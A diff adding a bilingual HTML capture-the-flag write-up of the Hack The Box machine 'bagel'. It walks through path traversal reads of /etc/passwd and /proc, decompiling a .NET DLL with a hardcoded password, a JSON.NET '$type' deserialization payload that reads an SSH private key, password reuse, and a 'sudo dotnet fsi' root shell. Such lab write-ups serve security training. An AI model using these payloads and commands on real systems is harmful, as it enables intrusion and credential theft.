@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>bagel | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">bagel</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine exposed a Werkzeug web application on port 8000 with a path traversal vulnerability in the <code>page</code> parameter. By exploiting this vulnerability, I was able to read arbitrary files from the filesystem, including a .NET DLL binary located at <code>/opt/bagel/bin/Debug/net6.0/bagel.dll</code>.</p>
+                    
+                    <p>After decompiling the DLL, I discovered that a WebSocket service running on port 5000 was vulnerable to unsafe JSON deserialization due to the use of <code>TypeNameHandling.All</code> in .NET's JSON.NET library. This configuration allows attackers to specify arbitrary .NET types during deserialization, leading to type confusion attacks. By crafting a malicious JSON payload that abused the <code>File</code> class in the <code>bagel_server</code> namespace, I could read arbitrary files through the WebSocket service, obtaining the SSH private key of user <code>phil</code>.</p>
+                    
+                    <p>After gaining SSH access as <code>phil</code>, I performed lateral movement to the <code>developer</code> user using a hardcoded database password found in the DLL. The <code>developer</code> user had <code>sudo</code> privileges to run <code>/usr/bin/dotnet</code> without a password, which I exploited to spawn a root shell by executing F# interactive code that launched <code>/bin/bash</code>.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Path traversal vulnerability, unsafe .NET JSON deserialization (TypeNameHandling.All), WebSocket service exploitation, sudo privilege escalation via dotnet binary.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and running services on the target:</p>
+                <pre><code class="language-plaintext">22/tcp   open  ssh
+5000/tcp open  upnp?
+8000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.10.9)
+         http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html</code></pre>
+
+                <p>The scan reveals three open ports: SSH on port 22, an unknown service on port 5000, and a Werkzeug HTTP server on port 8000. The HTTP server shows an interesting redirect with a <code>page</code> parameter that references a file, which could be susceptible to path traversal attacks.</p>
+
+                <p>Running <code>whatweb</code> against the web service provides additional information:</p>
+                <pre><code class="language-plaintext">http://bagel.htb:8000/?page=index.html [200 OK] 
+Bootstrap, Country[RESERVED][ZZ], HTML5, 
+HTTPServer[Werkzeug/2.2.2 Python/3.10.9], 
+JQuery, Meta-Author[freehtml5.co], 
+Python[3.10.9], Werkzeug[2.2.2]</code></pre>
+
+                <h2>Path Traversal Discovery</h2>
+                <p>The <code>page</code> parameter immediately stands out as a potential attack vector. Testing for path traversal confirms the vulnerability:</p>
+                <pre><code class="language-bash">curl http://bagel.htb:8000/?page=../../../../../../../../etc/passwd | grep bash</code></pre>
+
+                <p>The server returns the contents of <code>/etc/passwd</code>, revealing several users with bash shells:</p>
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+developer:x:1000:1000::/home/developer:/bin/bash
+phil:x:1001:1001::/home/phil:/bin/bash</code></pre>
+
+                <p>Now that I've confirmed path traversal, I can read arbitrary files on the system. Let me explore the application's source code to understand what's running.</p>
+
+                <h2>Application Source Code Analysis</h2>
+                <p>Reading the Flask application code at <code>/home/developer/app/app.py</code> reveals an interesting comment about the service running on port 5000:</p>
+                <pre><code class="language-python">@app.route('/orders')
+def order():
+    # don't forget to run the order app first with "dotnet <path to .dll>" command
+    # Use your ssh key to access the machine.
+    try:
+        ws = websocket.WebSocket()
+        ws.connect("ws://127.0.0.1:5000/")  # connect to order app
+        order = {"ReadOrder":"orders.txt"}</code></pre>
+
+                <p>This reveals that port 5000 is running a WebSocket service built with .NET. The application connects to this WebSocket and sends JSON messages to read order files.</p>
+
+                <h3>Testing the WebSocket Service</h3>
+                <p>I can interact with this WebSocket service directly using <code>wscat</code>:</p>
+                <pre><code class="language-bash">wscat -c ws://bagel.htb:5000</code></pre>
+
+                <p>Sending the same JSON message as the Flask app:</p>
+                <pre><code class="language-json">{"ReadOrder":"orders.txt"}</code></pre>
+
+                <p>The service responds with structured data:</p>
+                <pre><code class="language-json">{
+  "UserId": 0,
+  "Session": "Unauthorized",
+  "Time": "4:38:25",
+  "RemoveOrder": null,
+  "WriteOrder": null,
+  "ReadOrder": "order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels]\norder #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels]\norder #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels]"
+}</code></pre>
+
+                <p>Testing for path traversal with <code>../../</code> sequences doesn't work here, suggesting different input validation than the web service.</p>
+
+                <h2>Finding the .NET Application</h2>
+                <p>The Flask code mentioned that the WebSocket service is a .NET application running with <code>dotnet</code>. I can identify which process this is by checking the <code>/proc</code> filesystem for processes running dotnet.</p>
+
+                <p>First, I determine that the Flask application runs from <code>/home/developer/app</code>:</p>
+                <pre><code class="language-bash">curl -o- http://bagel.htb:8000/?page=../../../../proc/self/cmdline</code></pre>
+                <pre><code class="language-plaintext">python3/home/developer/app/app.py</code></pre>
+
+                <p>Now I'll search for processes containing the word "dotnet" by fuzzing process IDs:</p>
+                <pre><code class="language-bash">ffuf -u http://bagel.htb:8000/?page=../../../../proc/FUZZ/cmdline -w <(seq 1 65535) -mr "dotnet"</code></pre>
+
+                <p>This discovers multiple PIDs (893, 920, 921, 924, 925, 926, 927, 928, 992, 1002, 1004) all running the same command:</p>
+                <pre><code class="language-bash">curl -o- http://bagel.htb:8000/?page=../../../../proc/893/cmdline</code></pre>
+                <pre><code class="language-plaintext">dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll</code></pre>
+
+                <h2>Analyzing the .NET DLL</h2>
+                <p>Now that I know the location of the DLL, I can download it using the path traversal vulnerability:</p>
+                <pre><code class="language-bash">curl http://bagel.htb:8000/?page=../../../../opt/bagel/bin/Debug/net6.0/bagel.dll -o bagel.dll</code></pre>
+
+                <p>To analyze the DLL, I need a .NET decompiler. I'll use <code>ilspycmd</code>, which can decompile .NET assemblies to C# source code:</p>
+                <pre><code class="language-bash">dotnet tool install --global ilspycmd --version 7.2.0.6845</code></pre>
+
+                <p>Decompiling the DLL:</p>
+                <pre><code class="language-bash">ilspycmd bagel.dll > decompiled.cs</code></pre>
+
+                <h3>Discovering Hardcoded Credentials</h3>
+                <p>In the decompiled code, I find a hardcoded database password:</p>
+                <pre><code class="language-csharp">string connectionString = "server=localhost;user=dev;password=k8wdAYYKyhnjg3K;database=orders";</code></pre>
+
+                <p>Testing this password with SSH for the <code>developer</code> user fails, but I'll keep it noted for later use.</p>
+
+                <h3>Unsafe JSON Deserialization Vulnerability</h3>
+                <p>The most critical finding is in the <code>Handler</code> class, which handles JSON serialization and deserialization:</p>
+                <pre><code class="language-csharp">public class Handler
+{
+    public object Serialize(object obj)
+    {
+        JsonSerializerSettings val = new JsonSerializerSettings();
+        val.set_TypeNameHandling((TypeNameHandling)4);
+        return JsonConvert.SerializeObject(obj, (Formatting)1, val);
+    }
+
+    public object Deserialize(string json)
+    {
+        try
+        {
+            JsonSerializerSettings val = new JsonSerializerSettings();
+            val.set_TypeNameHandling((TypeNameHandling)4);
+            return JsonConvert.DeserializeObject<Base>(json, val);
+        }
+        catch
+        {
+            return "{\"Message\":\"unknown\"}";
+        }
+    }
+}</code></pre>
+
+                <p>The value <code>4</code> corresponds to <code>TypeNameHandling.All</code> according to the <a href="https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm">Newtonsoft.Json documentation</a>. This setting is extremely dangerous because it allows the client to specify arbitrary .NET types in JSON, which the deserializer will instantiate.</p>
+
+                <h3>Understanding the Attack</h3>
+                <p>When <code>TypeNameHandling.All</code> is enabled, an attacker can craft JSON payloads that include a <code>$type</code> property specifying any .NET class available in the application's assembly or its dependencies. During deserialization, the specified class will be instantiated, and its properties will be set according to the JSON data.</p>
+
+                <p>This is explained in detail in this article: <a href="https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15">Exploiting JSON Serialization in .NET Core</a></p>
+
+                <p>Looking through the decompiled code, I find a <code>File</code> class in the <code>bagel_server</code> namespace that has a <code>ReadFile</code> property - perfect for reading arbitrary files!</p>
+
+                <h2>Exploiting JSON Deserialization for File Read</h2>
+                <p>To construct a working payload, I need the assembly name of the DLL. I can extract this using <code>monodis</code>:</p>
+                <pre><code class="language-bash">monodis --assembly bagel.dll</code></pre>
+                <pre><code class="language-plaintext">Assembly Table
+Name: bagel</code></pre>
+
+                <p>Now I can construct a malicious JSON payload that will instantiate the <code>File</code> class and read arbitrary files:</p>
+                <pre><code class="language-json">{
+  "RemoveOrder": {
+    "$type": "bagel_server.File, bagel",
+    "ReadFile": "../../../../../../etc/passwd"
+  }
+}</code></pre>
+
+                <p>The payload structure:</p>
+                <ul>
+                    <li><code>$type</code>: Specifies the .NET type as <code>namespace.ClassName, AssemblyName</code></li>
+                    <li><code>ReadFile</code>: A property of the <code>File</code> class that accepts a file path</li>
+                    <li>The value uses path traversal to escape the application's working directory</li>
+                </ul>
+
+                <p>Testing this payload with <code>wscat</code>:</p>
+                <pre><code class="language-bash">wscat -c ws://bagel.htb:5000</code></pre>
+                <pre><code class="language-json">{"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../../../../etc/passwd"}}</code></pre>
+
+                <p>Success! The WebSocket service returns the contents of <code>/etc/passwd</code> in the response. This confirms the JSON deserialization vulnerability allows arbitrary file reads.</p>
+
+                <h2>Initial Access - Reading SSH Keys</h2>
+                <p>Now that I can read arbitrary files, I'll target SSH private keys. First, let me check which user's home directory the .NET application runs from by reading its environment variables:</p>
+                <pre><code class="language-json">{"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../../../../proc/self/environ"}}</code></pre>
+
+                <p>The response shows:</p>
+                <pre><code class="language-plaintext">HOME=/home/phil</code></pre>
+
+                <p>The application runs as the <code>phil</code> user. I'll attempt to read phil's SSH private key:</p>
+                <pre><code class="language-json">{"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../../../../home/phil/.ssh/id_rsa"}}</code></pre>
+
+                <p>The WebSocket returns phil's private SSH key! I save this to a file, set the correct permissions, and connect:</p>
+                <pre><code class="language-bash">chmod 600 id_rsa
+ssh -i id_rsa phil@bagel.htb</code></pre>
+
+                <p>I now have SSH access as <code>phil</code> and can retrieve the user flag.</p>
+
+                <h2>Lateral Movement to Developer</h2>
+                <p>Remembering the hardcoded database password I found earlier in the decompiled DLL (<code>k8wdAYYKyhnjg3K</code>), I test if it's reused by the <code>developer</code> user:</p>
+                <pre><code class="language-bash">su developer</code></pre>
+
+                <p>Entering the password <code>k8wdAYYKyhnjg3K</code> successfully switches to the <code>developer</code> user. This is a common security mistake - using database credentials as system account passwords.</p>
+
+                <h2>Privilege Escalation - Dotnet Sudo Abuse</h2>
+                <p>Checking the <code>developer</code> user's sudo privileges:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>The output reveals:</p>
+                <pre><code class="language-plaintext">User developer may run the following commands on bagel:
+    (root) NOPASSWD: /usr/bin/dotnet</code></pre>
+
+                <p>The <code>developer</code> user can run <code>dotnet</code> as root without a password. This is a critical misconfiguration because dotnet can execute arbitrary code.</p>
+
+                <h3>Exploiting Dotnet for Root Access</h3>
+                <p>Checking <a href="https://gtfobins.github.io/gtfobins/dotnet/">GTFOBins for dotnet</a>, I find a straightforward privilege escalation technique using F# interactive (fsi):</p>
+                <pre><code class="language-bash">sudo dotnet fsi</code></pre>
+
+                <p>This launches an F# interactive shell running as root. From here, I can execute system commands. To spawn a bash shell:</p>
+                <pre><code class="language-fsharp">System.Diagnostics.Process.Start("/bin/bash").WaitForExit();;</code></pre>
+
+                <p>This F# code creates a new process running <code>/bin/bash</code> and waits for it to exit, effectively giving me a root shell:</p>
+                <pre><code class="language-bash">whoami</code></pre>
+                <pre><code class="language-plaintext">root</code></pre>
+
+                <p>I now have root access and can retrieve the root flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo exponía una aplicación web Werkzeug en el puerto 8000 con una vulnerabilidad de path traversal en el parámetro <code>page</code>. Explotando esta vulnerabilidad, pude leer archivos arbitrarios del sistema de archivos, incluyendo un binario DLL de .NET ubicado en <code>/opt/bagel/bin/Debug/net6.0/bagel.dll</code>.</p>
+                    
+                    <p>Tras decompilar el DLL, descubrí que un servicio WebSocket ejecutándose en el puerto 5000 era vulnerable a deserialización JSON insegura debido al uso de <code>TypeNameHandling.All</code> en la biblioteca JSON.NET de .NET. Esta configuración permite a los atacantes especificar tipos .NET arbitrarios durante la deserialización, llevando a ataques de confusión de tipos. Creando un payload JSON malicioso que abusaba de la clase <code>File</code> en el namespace <code>bagel_server</code>, pude leer archivos arbitrarios a través del servicio WebSocket, obteniendo la clave privada SSH del usuario <code>phil</code>.</p>
+                    
+                    <p>Tras conseguir acceso SSH como <code>phil</code>, realicé un movimiento lateral al usuario <code>developer</code> usando una contraseña de base de datos hardcodeada encontrada en el DLL. El usuario <code>developer</code> tenía privilegios <code>sudo</code> para ejecutar <code>/usr/bin/dotnet</code> sin contraseña, lo cual exploté para spawnear una shell root ejecutando código F# interactivo que lanzaba <code>/bin/bash</code>.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Vulnerabilidad de path traversal, deserialización JSON insegura en .NET (TypeNameHandling.All), explotación de servicio WebSocket, escalada de privilegios sudo mediante binario dotnet.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en ejecución en el objetivo:</p>
+                <pre><code class="language-plaintext">22/tcp   open  ssh
+5000/tcp open  upnp?
+8000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.10.9)
+         http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html</code></pre>
+
+                <p>El escaneo revela tres puertos abiertos: SSH en el puerto 22, un servicio desconocido en el puerto 5000, y un servidor HTTP Werkzeug en el puerto 8000. El servidor HTTP muestra una redirección interesante con un parámetro <code>page</code> que referencia un archivo, lo cual podría ser susceptible a ataques de path traversal.</p>
+
+                <p>Ejecutando <code>whatweb</code> contra el servicio web proporciona información adicional:</p>
+                <pre><code class="language-plaintext">http://bagel.htb:8000/?page=index.html [200 OK] 
+Bootstrap, Country[RESERVED][ZZ], HTML5, 
+HTTPServer[Werkzeug/2.2.2 Python/3.10.9], 
+JQuery, Meta-Author[freehtml5.co], 
+Python[3.10.9], Werkzeug[2.2.2]</code></pre>
+
+                <h2>Descubrimiento de Path Traversal</h2>
+                <p>El parámetro <code>page</code> destaca inmediatamente como un potencial vector de ataque. Probando path traversal confirmo la vulnerabilidad:</p>
+                <pre><code class="language-bash">curl http://bagel.htb:8000/?page=../../../../../../../../etc/passwd | grep bash</code></pre>
+
+                <p>El servidor devuelve el contenido de <code>/etc/passwd</code>, revelando varios usuarios con shells bash:</p>
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+developer:x:1000:1000::/home/developer:/bin/bash
+phil:x:1001:1001::/home/phil:/bin/bash</code></pre>
+
+                <p>Ahora que he confirmado el path traversal, puedo leer archivos arbitrarios en el sistema. Voy a explorar el código fuente de la aplicación para entender qué está ejecutándose.</p>
+
+                <h2>Análisis del Código Fuente de la Aplicación</h2>
+                <p>Leyendo el código de la aplicación Flask en <code>/home/developer/app/app.py</code> revela un comentario interesante sobre el servicio ejecutándose en el puerto 5000:</p>
+                <pre><code class="language-python">@app.route('/orders')
+def order():
+    # don't forget to run the order app first with "dotnet <path to .dll>" command
+    # Use your ssh key to access the machine.
+    try:
+        ws = websocket.WebSocket()
+        ws.connect("ws://127.0.0.1:5000/")  # connect to order app
+        order = {"ReadOrder":"orders.txt"}</code></pre>
+
+                <p>Esto revela que el puerto 5000 está ejecutando un servicio WebSocket construido con .NET. La aplicación se conecta a este WebSocket y envía mensajes JSON para leer archivos de pedidos.</p>
+
+                <h3>Probando el Servicio WebSocket</h3>
+                <p>Puedo interactuar con este servicio WebSocket directamente usando <code>wscat</code>:</p>
+                <pre><code class="language-bash">wscat -c ws://bagel.htb:5000</code></pre>
+
+                <p>Enviando el mismo mensaje JSON que la aplicación Flask:</p>
+                <pre><code class="language-json">{"ReadOrder":"orders.txt"}</code></pre>
+
+                <p>El servicio responde con datos estructurados:</p>
+                <pre><code class="language-json">{
+  "UserId": 0,
+  "Session": "Unauthorized",
+  "Time": "4:38:25",
+  "RemoveOrder": null,
+  "WriteOrder": null,
+  "ReadOrder": "order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels]\norder #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels]\norder #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels]"
+}</code></pre>
+
+                <p>Probando path traversal con secuencias <code>../../</code> no funciona aquí, sugiriendo una validación de entrada diferente a la del servicio web.</p>
+
+                <h2>Encontrando la Aplicación .NET</h2>
+                <p>El código Flask mencionaba que el servicio WebSocket es una aplicación .NET ejecutándose con <code>dotnet</code>. Puedo identificar qué proceso es este comprobando el sistema de archivos <code>/proc</code> en busca de procesos ejecutando dotnet.</p>
+
+                <p>Primero, determino que la aplicación Flask se ejecuta desde <code>/home/developer/app</code>:</p>
+                <pre><code class="language-bash">curl -o- http://bagel.htb:8000/?page=../../../../proc/self/cmdline</code></pre>
+                <pre><code class="language-plaintext">python3/home/developer/app/app.py</code></pre>
+
+                <p>Ahora buscaré procesos que contengan la palabra "dotnet" fuzzeando IDs de proceso:</p>
+                <pre><code class="language-bash">ffuf -u http://bagel.htb:8000/?page=../../../../proc/FUZZ/cmdline -w <(seq 1 65535) -mr "dotnet"</code></pre>
+
+                <p>Esto descubre múltiples PIDs (893, 920, 921, 924, 925, 926, 927, 928, 992, 1002, 1004) todos ejecutando el mismo comando:</p>
+                <pre><code class="language-bash">curl -o- http://bagel.htb:8000/?page=../../../../proc/893/cmdline</code></pre>
+                <pre><code class="language-plaintext">dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll</code></pre>
+
+                <h2>Analizando el DLL de .NET</h2>
+                <p>Ahora que conozco la ubicación del DLL, puedo descargarlo usando la vulnerabilidad de path traversal:</p>
+                <pre><code class="language-bash">curl http://bagel.htb:8000/?page=../../../../opt/bagel/bin/Debug/net6.0/bagel.dll -o bagel.dll</code></pre>
+
+                <p>Para analizar el DLL, necesito un decompilador .NET. Usaré <code>ilspycmd</code>, que puede decompilar assemblies .NET a código fuente C#:</p>
+                <pre><code class="language-bash">dotnet tool install --global ilspycmd --version 7.2.0.6845</code></pre>
+
+                <p>Decompilando el DLL:</p>
+                <pre><code class="language-bash">ilspycmd bagel.dll > decompiled.cs</code></pre>
+
+                <h3>Descubriendo Credenciales Hardcodeadas</h3>
+                <p>En el código decompilado, encuentro una contraseña de base de datos hardcodeada:</p>
+                <pre><code class="language-csharp">string connectionString = "server=localhost;user=dev;password=k8wdAYYKyhnjg3K;database=orders";</code></pre>
+
+                <p>Probando esta contraseña con SSH para el usuario <code>developer</code> falla, pero la guardo anotada para usarla más adelante.</p>
+
+                <h3>Vulnerabilidad de Deserialización JSON Insegura</h3>
+                <p>El hallazgo más crítico está en la clase <code>Handler</code>, que maneja la serialización y deserialización JSON:</p>
+                <pre><code class="language-csharp">public class Handler
+{
+    public object Serialize(object obj)
+    {
+        JsonSerializerSettings val = new JsonSerializerSettings();
+        val.set_TypeNameHandling((TypeNameHandling)4);
+        return JsonConvert.SerializeObject(obj, (Formatting)1, val);
+    }
+
+    public object Deserialize(string json)
+    {
+        try
+        {
+            JsonSerializerSettings val = new JsonSerializerSettings();
+            val.set_TypeNameHandling((TypeNameHandling)4);
+            return JsonConvert.DeserializeObject<Base>(json, val);
+        }
+        catch
+        {
+            return "{\"Message\":\"unknown\"}";
+        }
+    }
+}</code></pre>
+
+                <p>El valor <code>4</code> corresponde a <code>TypeNameHandling.All</code> según la <a href="https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm">documentación de Newtonsoft.Json</a>. Esta configuración es extremadamente peligrosa porque permite al cliente especificar tipos .NET arbitrarios en JSON, que el deserializador instanciará.</p>
+
+                <h3>Entendiendo el Ataque</h3>
+                <p>Cuando <code>TypeNameHandling.All</code> está habilitado, un atacante puede crear payloads JSON que incluyan una propiedad <code>$type</code> especificando cualquier clase .NET disponible en el assembly de la aplicación o sus dependencias. Durante la deserialización, la clase especificada será instanciada, y sus propiedades se establecerán según los datos JSON.</p>
+
+                <p>Esto se explica en detalle en este artículo: <a href="https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15">Exploiting JSON Serialization in .NET Core</a></p>
+
+                <p>Revisando el código decompilado, encuentro una clase <code>File</code> en el namespace <code>bagel_server</code> que tiene una propiedad <code>ReadFile</code> - ¡perfecta para leer archivos arbitrarios!</p>
+
+                <h2>Explotando la Deserialización JSON para Lectura de Archivos</h2>
+                <p>Para construir un payload funcional, necesito el nombre del assembly del DLL. Puedo extraerlo usando <code>monodis</code>:</p>
+                <pre><code class="language-bash">monodis --assembly bagel.dll</code></pre>
+                <pre><code class="language-plaintext">Assembly Table
+Name: bagel</code></pre>
+
+                <p>Ahora puedo construir un payload JSON malicioso que instanciará la clase <code>File</code> y leerá archivos arbitrarios:</p>
+                <pre><code class="language-json">{
+  "RemoveOrder": {
+    "$type": "bagel_server.File, bagel",
+    "ReadFile": "../../../../../../etc/passwd"
+  }
+}</code></pre>
+
+                <p>La estructura del payload:</p>
+                <ul>
+                    <li><code>$type</code>: Especifica el tipo .NET como <code>namespace.ClassName, AssemblyName</code></li>
+                    <li><code>ReadFile</code>: Una propiedad de la clase <code>File</code> que acepta una ruta de archivo</li>
+                    <li>El valor usa path traversal para escapar del directorio de trabajo de la aplicación</li>
+                </ul>
+
+                <p>Probando este payload con <code>wscat</code>:</p>
+                <pre><code class="language-bash">wscat -c ws://bagel.htb:5000</code></pre>
+                <pre><code class="language-json">{"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../../../../etc/passwd"}}</code></pre>
+
+                <p>¡Éxito! El servicio WebSocket devuelve el contenido de <code>/etc/passwd</code> en la respuesta. Esto confirma que la vulnerabilidad de deserialización JSON permite lecturas de archivos arbitrarios.</p>
+
+                <h2>Acceso Inicial - Leyendo Claves SSH</h2>
+                <p>Ahora que puedo leer archivos arbitrarios, apuntaré a claves privadas SSH. Primero, déjame comprobar desde qué directorio home se ejecuta la aplicación .NET leyendo sus variables de entorno:</p>
+                <pre><code class="language-json">{"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../../../../proc/self/environ"}}</code></pre>
+
+                <p>La respuesta muestra:</p>
+                <pre><code class="language-plaintext">HOME=/home/phil</code></pre>
+
+                <p>La aplicación se ejecuta como el usuario <code>phil</code>. Intentaré leer la clave privada SSH de phil:</p>
+                <pre><code class="language-json">{"RemoveOrder": {"$type": "bagel_server.File, bagel", "ReadFile": "../../../../../../home/phil/.ssh/id_rsa"}}</code></pre>
+
+                <p>¡El WebSocket devuelve la clave privada SSH de phil! Guardo esto en un archivo, establezco los permisos correctos, y me conecto:</p>
+                <pre><code class="language-bash">chmod 600 id_rsa
+ssh -i id_rsa phil@bagel.htb</code></pre>
+
+                <p>Ahora tengo acceso SSH como <code>phil</code> y puedo recuperar la flag de usuario.</p>
+
+                <h2>Movimiento Lateral a Developer</h2>
+                <p>Recordando la contraseña de base de datos hardcodeada que encontré antes en el DLL decompilado (<code>k8wdAYYKyhnjg3K</code>), pruebo si es reutilizada por el usuario <code>developer</code>:</p>
+                <pre><code class="language-bash">su developer</code></pre>
+
+                <p>Introduciendo la contraseña <code>k8wdAYYKyhnjg3K</code> cambio exitosamente al usuario <code>developer</code>. Este es un error de seguridad común - usar credenciales de base de datos como contraseñas de cuentas del sistema.</p>
+
+                <h2>Escalada de Privilegios - Abuso de Sudo con Dotnet</h2>
+                <p>Comprobando los privilegios sudo del usuario <code>developer</code>:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>La salida revela:</p>
+                <pre><code class="language-plaintext">User developer may run the following commands on bagel:
+    (root) NOPASSWD: /usr/bin/dotnet</code></pre>
+
+                <p>El usuario <code>developer</code> puede ejecutar <code>dotnet</code> como root sin contraseña. Esta es una mala configuración crítica porque dotnet puede ejecutar código arbitrario.</p>
+
+                <h3>Explotando Dotnet para Acceso Root</h3>
+                <p>Consultando <a href="https://gtfobins.github.io/gtfobins/dotnet/">GTFOBins para dotnet</a>, encuentro una técnica de escalada de privilegios directa usando F# interactivo (fsi):</p>
+                <pre><code class="language-bash">sudo dotnet fsi</code></pre>
+
+                <p>Esto lanza una shell interactiva F# ejecutándose como root. Desde aquí, puedo ejecutar comandos del sistema. Para spawnear una shell bash:</p>
+                <pre><code class="language-fsharp">System.Diagnostics.Process.Start("/bin/bash").WaitForExit();;</code></pre>
+
+                <p>Este código F# crea un nuevo proceso ejecutando <code>/bin/bash</code> y espera a que termine, dándome efectivamente una shell root:</p>
+                <pre><code class="language-bash">whoami</code></pre>
+                <pre><code class="language-plaintext">root</code></pre>
+
+                <p>Ahora tengo acceso root y puedo recuperar la flag de root, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
